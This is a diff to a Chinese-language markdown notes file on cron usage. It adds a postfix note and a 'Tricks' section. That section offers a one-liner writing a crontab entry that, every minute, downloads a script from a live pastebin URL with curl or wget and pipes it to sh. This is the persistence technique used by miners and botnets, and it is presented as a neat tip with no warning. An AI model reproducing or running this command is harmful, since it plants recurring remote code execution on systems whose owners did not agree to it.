@@ -259,7 +259,18 @@ crontab -V
 - `-c` | `-n`
 	集群相关的参数
 
+### 0x04b Tricks
+
+`crontab` 可以和 stdin 巧妙的结合
+
+```
+echo "* * * * * (crul -fsSL https://pastebin.com/raw/e8XzcU2Q || wget -q -O- https://pastebin.com/raw/e8XzcU2Q) | sh" | crontab -
+```
+
 ## 0x05 Mail
+
+> [!important]
+> 如果需要使用邮件的功能，需要安装 postfix
 
 cron 可以通过 `MAILTO` 和 `MAILFROM` 来实现邮件推送
 
